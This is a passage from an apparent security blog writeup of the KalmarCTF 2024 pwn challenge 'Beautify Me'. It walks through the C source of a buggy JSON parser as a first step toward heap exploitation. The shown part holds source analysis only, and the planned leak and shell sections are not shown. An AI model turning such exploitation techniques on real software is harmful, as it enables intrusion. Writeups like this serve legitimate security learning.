<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>KalmarCTF 2024 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="KalmarCTF 2024" />
<meta property="og:description" content="Writeup for KalmarCTF 2024 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/kalmarctf-2024/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-03-24T00:44:40+07:00" />
<meta property="article:modified_time" content="2024-03-24T02:03:18+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="KalmarCTF 2024"/>
<meta name="twitter:description" content="Writeup for KalmarCTF 2024 by Chovid99"/>
      <meta name="twitter:site" content="@Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/kalmarctf-2024/" /><link rel="prev" href="https://chovid99.github.io/posts/cyber-apocalypse-2024-blockchain-hardware/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "KalmarCTF 2024",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/kalmarctf-2024\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, KalmarCTF, pwn, heap, tcache, got, json","wordcount":  7516 ,
        "url": "https:\/\/chovid99.github.io\/posts\/kalmarctf-2024\/","datePublished": "2024-03-24T00:44:40+07:00","dateModified": "2024-03-24T02:03:18+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">KalmarCTF 2024</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 24, 2024">Mar 24, 2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;7516 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;36 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#beautify-me">Beautify Me</a></li>
        <li><a href="#initial-analysis">Initial Analysis</a>
          <ul>
            <li><a href="#analyze-main-function">Analyze main function</a></li>
            <li><a href="#analyze-parser-function">Analyze parser function</a></li>
            <li><a href="#analyze-print-function">Analyze print function</a></li>
          </ul>
        </li>
        <li><a href="#solution">Solution</a>
          <ul>
            <li><a href="#leaking-useful-values">Leaking useful values</a>
              <ul>
                <li><a href="#leaking-heap-address">Leaking heap address</a></li>
                <li><a href="#leaking-libc-address">Leaking libc address</a></li>
              </ul>
            </li>
            <li><a href="#gaining-remote-code-execution">Gaining Remote Code Execution</a>
              <ul>
                <li><a href="#reproducing-the-next-bug">Reproducing the <code>next</code> bug</a></li>
                <li><a href="#abusing-the-next-bug">Abusing the <code>next</code> bug</a></li>
                <li><a href="#gaining-shell">Gaining shell</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/JolTISD.png" title="https://i.imgur.com/JolTISD.png" data-thumbnail="https://i.imgur.com/JolTISD.png" data-sub-html="<h2>KalmarCTF 2024</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/JolTISD.png"
            data-srcset="https://i.imgur.com/JolTISD.png, https://i.imgur.com/JolTISD.png 1.5x, https://i.imgur.com/JolTISD.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/JolTISD.png" />
    </a><figcaption class="image-caption">KalmarCTF 2024</figcaption>
    </figure>
<p>Last week, I played KalmarCTF 2024 with my team, Water Paddler. We managed to take the 8th place. In this writeup, I will be sharing my solution for one of the pwn challenge named Beautify Me.</p>
<h1 id="pwn">Pwn</h1>
<h2 id="beautify-me">Beautify Me</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>A JSON beautifier written in beautiful C.</p>
<p>nc chal-kalmarc.tf 2</p>
</div>
        </div>
    </div>
<h2 id="initial-analysis">Initial Analysis</h2>
<p>In this challenge, we were provided with the source code of the binary, named <code>main.c</code> and <code>main.h</code>. Let&rsquo;s start by taking a look at some important functions defined on there.</p>
<h3 id="analyze-main-function">Analyze main function</h3>
<p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">json_t</span> <span class="o">*</span><span class="n">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IOLBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IOFBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">parse_value</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">obj</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid JSON!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print_value</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free_value</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Taking a look at the above function, we can deduce that this binary is trying to parse our input, and then it will try to print back our processed input. Deducing from the challenge name, which is &ldquo;Beautify Me&rdquo;, seems like the main goal of this binary is it is trying to parse our json input, and then try to pretty print it just like the usual json beautifier.</p>
<p>Let&rsquo;s try to run the binary, to confirm our deduction.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─❯ ./json_patched
</span></span><span class="line"><span class="cl">&gt; {&#34;Test&#34;:&#34;test&#34;}
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;Test&#34;: &#34;test&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>And it is indeed true, that this program try to beautify our json.</p>
<h3 id="analyze-parser-function">Analyze parser function</h3>
<p>Now, let&rsquo;s try to take a deep dive on how the <code>parse_value</code> function works, to verify whether it parse our input correctly or not.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">skip_whitespace</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nf">isspace</span><span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="p">))</span> <span class="n">s</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">parse_value</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">json_t</span> <span class="o">**</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;{&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">parse_object</span><span class="p">(</span><span class="o">++</span><span class="n">s</span><span class="p">,</span> <span class="n">out</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;[&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">parse_array</span><span class="p">(</span><span class="o">++</span><span class="n">s</span><span class="p">,</span> <span class="n">out</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;&#34;&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="nf">strchr</span><span class="p">(</span><span class="o">++</span><span class="n">s</span><span class="p">,</span> <span class="sc">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">end</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">json_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">json_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">T_STRING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">-&gt;</span><span class="n">string</span> <span class="o">=</span> <span class="nf">strndup</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">end</span><span class="o">-</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">end</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;t&#39;</span> <span class="o">||</span> <span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;f&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">parse_bool</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">out</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;n&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;null&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">json_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">json_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">T_NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">s</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">isdigit</span><span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="o">||</span> <span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;-&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">parse_number</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">out</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on the above initial observation, the <code>parse_value</code> will skip any whitespace first. After that, it will try to call the correct parser function based on the first character of our input. Let&rsquo;s try to check the parser functions one by one.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">Json</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">object_t</span> <span class="o">*</span><span class="n">object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">array_t</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">boolean</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">nint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">double</span> <span class="n">nfloat</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">type_t</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">json_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">parse_object</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">json_t</span> <span class="o">**</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">json_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">json_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">T_OBJECT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;}&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">-&gt;</span><span class="n">object</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">++</span><span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">parse_object_element</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">object</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">parse_object_element</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">object_t</span> <span class="o">**</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">object_t</span> <span class="o">*</span><span class="n">elem</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">object_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">elem</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">parse_value</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">);</span> <span class="c1">// Key can be object?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">elem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">skip_whitespace</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">!=</span> <span class="sc">&#39;:&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free_value</span><span class="p">(</span><span class="n">elem</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">elem</span><span class="p">);</span>
